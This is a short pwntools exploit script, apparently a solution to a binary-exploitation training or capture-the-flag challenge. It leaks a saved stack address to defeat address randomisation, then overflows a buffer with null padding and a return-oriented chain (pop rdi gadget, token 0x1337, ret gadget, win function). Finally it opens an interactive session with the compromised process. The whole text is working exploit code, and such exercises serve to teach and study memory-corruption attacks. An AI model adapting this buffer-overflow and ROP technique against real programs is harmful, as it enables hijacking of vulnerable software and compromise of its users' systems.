from pwn import *

win_offset = 0x20ab
save_offset = 0x297c
r = process('/challenge/binary-exploitation-null-write-w')
save_adress = r.recvline_contains('(rsp+0x00c8)').decode().split('|')[3]
print(save_adress)
save_adress = int(save_adress, 16)
base = save_adress - save_offset
win_adress = win_offset + base
pop_rdi_gadjet = 0x29f3 + base
ret_gadjet = 0x101a + base
token = 0x1337

payload = (0xa0 + 8) * b'\0' + p64(pop_rdi_gadjet) + p64(token) + p64(ret_gadjet) + p64(win_adress)

r.send(payload)

r.interactive()




	
